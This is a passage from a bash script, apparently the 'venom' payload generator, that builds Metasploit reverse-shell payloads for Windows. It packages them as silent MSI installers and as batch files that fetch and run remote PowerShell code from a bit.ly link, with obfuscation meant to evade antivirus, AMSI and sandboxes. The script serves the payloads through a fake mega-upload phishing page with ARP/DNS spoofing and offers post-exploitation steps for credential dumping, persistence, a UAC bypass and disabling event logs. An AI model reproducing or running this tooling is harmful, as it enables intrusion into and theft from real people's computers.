-i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          fi\n        fi\n   fi\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nmv $IPATH/templates/exec[bak].rb $InJEc4 > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nrm $ApAcHe/$N4m.rb > /dev/null 2>&1\nrm $ApAcHe/installer.bat > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_microsoft_menu\n  clear\nfi\n}\n\n\n\n\n\n\n# -------------------------------------------\n# build shellcode in MSI (windows-platforms)\n# and build installer.bat to use in winrar/sfx\n# to be executable by pressing on it :D\n# -------------------------------------------\nsh_shellcode8 () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\n# input payload choise\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"windows/shell_bind_tcp\" FALSE \"windows/shell/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp_dns\" FALSE \"windows/meterpreter/reverse_http\" FALSE \"windows/meterpreter/reverse_https\" FALSE \"windows/x64/meterpreter/reverse_tcp\" FALSE \"windows/x64/meterpreter/reverse_https\" --width 350 --height 350) > /dev/null 2>&1\nN4m=$(zenity --title=\"☠ MSI NAME ☠\" --text \"example: msiexec\" --entry --width 300) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"msiexec\";fi\n\necho \"[☠] Building shellcode -> msi format ...\"\nsleep 2\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : MSI -> WINDOWS\n    PAYLOAD : $paylo\n\n!\n\n# use metasploit to build shellcode\n# xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f msi > $IPATH/output/$N4m.msi\"\nif [ \"$paylo\" = \"windows/x64/meterpreter/reverse_tcp\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f msi-nouac > $IPATH/output/$N4m.msi\" > /dev/null 2>&1\nelse\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f msi-nouac > $IPATH/output/$N4m.msi\" > /dev/null 2>&1\nfi\n\n\necho \"\"\necho \"[☠] editing/backup files...\"\ncp $InJEc7 $IPATH/templates/hta_attack/index[bak].html\necho \"[☠] Injecting shellcode -> $N4m.msi!\"\nsleep 2\n# build winrar/SFX installer.bat script\necho \"[☠] Building winrar/SFX -> installer.bat...\"\nsleep 2\necho \":: SFX auxiliary | Author: r00t-3xp10it\" > $IPATH/output/installer.bat\necho \":: this script will run payload using msiexec\" >> $IPATH/output/installer.bat\necho \":: ---\" >> $IPATH/output/installer.bat\necho \"@echo off\" >> $IPATH/output/installer.bat\necho \"echo [*] Please wait, preparing software ...\" >> $IPATH/output/installer.bat\necho \"msiexec /quiet /qn /i $N4m.msi\" >> $IPATH/output/installer.bat\necho \"exit\" >> $IPATH/output/installer.bat\nsleep 2\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.msi\\n$IPATH/output/installer.bat\\n\\nExecute on cmd: msiexec /quiet /qn /i $N4m.msi\\n\\nchose how to deliver: $N4m.msi\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 350 --height 260) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n        fi\n      sleep 2\n\n\n   else\n\n\n      N4m2=$(zenity --title=\"☠ SFX Infection ☠\" --text \"WARNING BEFOR CLOSING THIS BOX:\\n\\nTo use SFX attack vector: $N4m.msi needs to be\\ncompressed together with installer.bat into one SFX\\n\\n1º compress the two files into one SFX\\n2º store SFX into shell/output folder\\n3º write the name of the SFX file\\n4º press OK to continue...\\n\\nExample:output.exe\" --entry --width 360) > /dev/null 2>&1\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"persistence.rc\" FALSE \"privilege_escalation.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 350) > /dev/null 2>&1\n\n  if [ \"$P0\" = \"persistence.rc\" ]; then\n  M1P=$(zenity --entry --title \"☠ AUTO-START PAYLOAD ☠\" --text \"\\nAuto-start payload Every specified hours 1-23\\n\\nexample: 23\\nwill auto-start installer.bat on target every 23 hours\" --width 300) > /dev/null 2>&1\n\n    cd $IPATH/aux\n    # Build persistence script (AutoRunStart='multi_console_command -r')\n    cp persistence.rc persistence[bak].rc\n    cp persistence2.rc persistence2[bak].rc\n    sed -i \"s|N4m|$N4m.msi|g\" persistence2.rc\n    sed -i \"s|IPATH|$IPATH|g\" persistence2.rc\n    sed \"s|M1P|$M1P|g\" persistence2.rc > persistence.rc\n\n    # Build listenner resource file\n    echo \"use exploit/multi/handler\" > $lhost.rc\n    echo \"set LHOST $lhost\" >> $lhost.rc\n    echo \"set LPORT $lport\" >> $lhost.rc\n    echo \"set PAYLOAD $paylo\" >> $lhost.rc\n    echo \"exploit\" >> $lhost.rc\n    mv $lhost.rc $IPATH/output/$lhost.rc\n    cd $IPATH\n\n    elif [ \"$P0\" = \"privilege_escalation.rc\" ]; then\n      cd $IPATH/aux\n      # backup files needed\n      cp privilege_escalation.rc privilege_escalation[bak].rc\n      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb\n      # Build resource files needed\n      sed -i \"s|N4m|$N4m2|g\" privilege_escalation.rc\n      sed -i \"s|IPATH|$IPATH|g\" privilege_escalation.rc\n      sed -i \"s|N4m|$N4m2|g\" enigma_fileless_uac_bypass.rb\n      # reload metasploit database\n      echo \"[☠] copy post-module to msf db!\"\n      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb\n      echo \"[☠] reloading -> Metasploit database!\"\n      xterm -T \" reloading -> Metasploit database \" -geometry 110x23 -e \"sudo msfconsole -x 'reload_all; exit -y'\" > /dev/null 2>&1\n      cd $IPATH\n\n\n  elif [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n\n\n  else\n\n    echo \"do nothing\" > /dev/null 2>&1\n\nfi\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m2|g\" mega.html > copy.html\n      cp copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m2 $ApAcHe/$N4m2 > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m2|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m2 $ApAcHe/$N4m2\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n          fi\n        fi\n   fi\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nmv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1\nmv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1\nmv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1\nmv $IPATH/aux/persistence2[bak].rc $IPATH/aux/persistence2.rc > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nrm $ApAcHe/$N4m > /dev/null 2>&1\nrm $ApAcHe/$N4m2 > /dev/null 2>&1\nrm $ApAcHe/installer.bat > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nsleep 2\nclear\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_microsoft_menu\n  clear\nfi\n}\n\n\n\n\n\n# --------------------------------------------------------------\n# build shellcode powershell <DownloadString> + Invoke-Shellcode\n# Matthew Graeber - powershell technics (Invoke-Shellcode)\n# --------------------------------------------------------------\nsh_shellcode9 () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nzenity --title=\"☠ WARNING: ☠\" --text \"'Invoke-Shellcode' technic only works\\nagaints 32 byte systems (windows)\" --info --width 300 > /dev/null 2>&1\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ SHELLCODE NAME ☠\" --text \"Enter shellcode output name\\nexample: Graeber\" --width 300) > /dev/null 2>&1\n# input payload choise\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"windows/meterpreter/reverse_http\" FALSE \"windows/meterpreter/reverse_https\" FALSE \"windows/x64/meterpreter/reverse_tcp\" FALSE \"windows/x64/meterpreter/reverse_https\" --width 350 --height 250) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"Graeber\";fi\n\necho \"[☠] Building shellcode -> powershell format ...\"\nsleep 2\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : PSH -> WINDOWS\n    PAYLOAD : $paylo\n\n!\n\n# use metasploit to build shellcode\n# sudo msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows EXITFUNC=thread -f c | sed '1,6d;s/[\";]//g;s/\\\\/,0/g' | tr -d '\\n' | cut -c2- > $IPATH/output/chars.raw\n\ncd $IPATH/aux\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"python Invoke-Shellcode.py --lhost $lhost --lport $lport --payload $paylo\" > /dev/null 2>&1\nrm *.ps1 > /dev/null 2>&1\nrm *.vbs > /dev/null 2>&1\n\n# display shellcode\nmv *.bat $IPATH/bin/sedding.raw\ndisp=`cat $IPATH/bin/sedding.raw | grep \"Shellcode\" | awk {'print $8'} | tr -d '\\n'`\necho \"$disp\" > $IPATH/output/chars.raw\necho \"\"\necho \"[☠] shellcode -> powershell encoded!\"\nsleep 2\necho $disp\necho \"\" && echo \"\"\nsleep 2\n\n# EDITING/BACKUP FILES NEEDED\necho \"[☠] editing/backup files...\"\ncp $InJEc8 $IPATH/templates/InvokePS1[bak].bat\ncp $InJEc7 $IPATH/templates/hta_attack/index[bak].html\nsleep 2\n\n\n   # check if chars.raw as generated\n   if [ -e $Ch4Rs ]; then\n      echo \"[☠] chars.raw -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] chars.raw -> not found!\"\n      exit\n      fi\n\n\n   # check if template exists\n   if [ -e $InJEc8 ]; then\n      echo \"[☠] InvokePS1.bat -> found!\"\n      sleep 2\n   else\n      echo \"[☠] InvokePS1.bat -> not found!\"\n      exit\n   fi\n\n\n# injecting shellcode into name\ncd $IPATH/templates/\necho \"[☠] Injecting shellcode -> $N4m.bat!\"\nsleep 2\n\n\nOBF=$(zenity --list --title \"☠ AGENT STRING OBFUSCATION ☠\" --text \"Obfuscate the agent [ template ] command arguments ?\\nUsing special escape characters, whitespaces, concaternation, amsi\\nsandbox evasion and variables piped and de-obfuscated at runtime\\n'The agent will delay 3 sec is execution to evade sandbox detection'\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"None-Obfuscation (default)\" FALSE \"String Obfuscation (3 sec)\" --width 353 --height 245) > /dev/null 2>&1\nif [ \"$OBF\" = \"None-Obfuscation (default)\" ]; then\necho \"@echo off&&cmd.exe /c powershell.exe IEX (New-Object system.Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode -Force -Shellcode $disp\" > $N4m.bat\nelse\necho \"[✔] String obfuscation technic sellected ..\"\n## OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)\n# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md\n#\n# STRING: powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode -Force -Shellcode $disp\necho \"@e%!%ch^O Of^f&&@c^Md%i%\\\".\\\"e%db%X^e ,/^R ,, =po%$'''!%W^er%,,,%She^ll.E^x%Count+3%e I%pP0%E^X (N%on%e^w-Obj^e%$,,,%ct N%i0%e^t.We^bC%A%lie^n%$'''d%t).Do%pP0%wn^loa%UI%d^Str^i%$'''E%ng('h'+'tt'+'p:'+'//bit.ly/14bZZ0'+'c');In^vo%Id%k%Count+8%e-S%$'''d%hel^l%,,;F%cod^e -For%en%ce -Sh%IN%e^ll%oOp%cod^e $disp\" > $N4m.bat\nfi\n\n\n#sed \"s|InJ3C|$disp|g\" InvokePS1.bat > $N4m.bat\nmv $N4m.bat $IPATH/output/$N4m.bat\nsleep 2\n\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.bat\\n\\nchose how to deliver: $N4m.bat\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 240) > /dev/null 2>&1\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n        fi\n      sleep 2\n\n\n   else\n\n\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"persistence.rc\" FALSE \"privilege_escalation.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 350) > /dev/null 2>&1\n\n  if [ \"$P0\" = \"persistence.rc\" ]; then\n  M1P=$(zenity --entry --title \"☠ AUTO-START PAYLOAD ☠\" --text \"\\nAuto-start payload Every specified hours 1-23\\n\\nexample: 23\\nwill auto-start $N4m.bat on target every 23 hours\" --width 300) > /dev/null 2>&1\n\n    cd $IPATH/aux\n    # Build persistence script (AutoRunStart='multi_console_command -r')\n    cp persistence.rc persistence[bak].rc\n    sed -i \"s|N4m|$N4m.bat|g\" persistence.rc\n    sed -i \"s|IPATH|$IPATH|g\" persistence.rc\n    sed -i \"s|M1P|$M1P|g\" persistence.rc\n\n    # Build listenner resource file\n    echo \"use exploit/multi/handler\" > $lhost.rc\n    echo \"set LHOST $lhost\" >> $lhost.rc\n    echo \"set LPORT $lport\" >> $lhost.rc\n    echo \"set PAYLOAD $paylo\" >> $lhost.rc\n    echo \"exploit\" >> $lhost.rc\n    mv $lhost.rc $IPATH/output/$lhost.rc\n    cd $IPATH\n\n    elif [ \"$P0\" = \"privilege_escalation.rc\" ]; then\n      cd $IPATH/aux\n      # backup files needed\n      cp privilege_escalation.rc privilege_escalation[bak].rc\n      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb\n      # Build resource files needed\n      sed -i \"s|N4m|$N4m.bat|g\" privilege_escalation.rc\n      sed -i \"s|IPATH|$IPATH|g\" privilege_escalation.rc\n      sed -i \"s|N4m|$N4m.bat|g\" enigma_fileless_uac_bypass.rb\n      # reload metasploit database\n      echo \"[☠] copy post-module to msf db!\"\n      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb\n      echo \"[☠] reloading -> Metasploit database!\"\n      xterm -T \" reloading -> Metasploit database \" -geometry 110x23 -e \"sudo msfconsole -x 'reload_all; exit -y'\" > /dev/null 2>&1\n      cd $IPATH\n\n\n  elif [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n\n\n  else\n\n    echo \"do nothing\" > /dev/null 2>&1\n\nfi\n\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.bat|g\" mega.html > copy.html\n      cp copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.bat $ApAcHe/$N4m.bat > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.bat|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.bat $ApAcHe/$N4m.bat\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD 